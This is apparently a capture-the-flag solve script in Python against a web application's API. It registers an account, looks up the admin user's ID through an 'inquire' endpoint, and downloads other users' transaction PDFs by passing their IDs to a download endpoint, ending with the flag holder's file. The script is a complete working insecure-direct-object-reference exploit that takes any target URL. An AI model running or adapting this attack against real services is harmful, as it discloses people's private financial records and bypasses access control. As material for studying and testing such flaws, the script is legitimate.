import requests
import sys

# Ensure correct usage
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <base_url>")
    sys.exit(1)

base_url = sys.argv[1].rstrip('/')  # Remove trailing slash if present

# Start a session
session = requests.Session()

# Optional: Visit the base URL first (to get cookies if needed)
session.get(base_url)

# Registration endpoint
register_url = f"{base_url}/api/v2/auth/register"

# Registration data
register_payload = {
    "username": "newuser",
    "email": "newemail@test.com",
    "password": "newnewnew"
}
headers = {
    "Content-Type": "application/json"
}

# Send POST request for registration
response = session.post(register_url, json=register_payload, headers=headers)
print("+++++ Registration completed. Now switching to login... +++++")

# Login request
login_url = f"{base_url}/api/v2/auth/login"
login_response = session.post(login_url, json=register_payload)

if login_response.status_code == 200:
    print("Login successful.")
else:
    print("Something went wrong during login.")

# Check user ID for 'neo_system'
inquire_url = f"{base_url}/api/v2/auth/inquire?username=neo_system"
inquire_response = session.get(inquire_url)

if inquire_response.status_code == 200:
    print("+++++ Successfully retrieved the username ID for 'neo_system'. Check the main page dashboard. +++++")
    res = inquire_response.json()
    admin_id = res["_id"]
    print(f"Target ID: {admin_id}")

# Target /api/v1/transactions/download-transactions
print("Targeting /api/v1/transactions/download-transactions... Observing initial response.")
transactions_url = f"{base_url}/api/v1/transactions/download-transactions"
initial_response = session.post(transactions_url)
print("Initial response content:")
print(initial_response.content)
print("It seems we need to provide an ID.")

# Request with admin ID
payload = {"_id": admin_id}
pdf_response = session.post(transactions_url, json=payload)

# Save the first PDF
with open("output.pdf", "wb") as f:
    f.write(pdf_response.content)
print("Check the folder. 'output.pdf' contains a user called 'user_with_flag'.")

# Target 'user_with_flag'
flag_inquire_url = f"{base_url}/api/v2/auth/inquire?username=user_with_flag"
flag_inquire_response = session.get(flag_inquire_url)
flag_res = flag_inquire_response.json()
flag_id = flag_res["_id"]
print(f"Target ID for flag extraction: {flag_id}")

# Download flag PDF
flag_payload = {"_id": flag_id}
flag_pdf_response = session.post(transactions_url, json=flag_payload)

with open("flag.pdf", "wb") as f:
    f.write(flag_pdf_response.content)
print("Flag saved in 'flag.pdf'.")
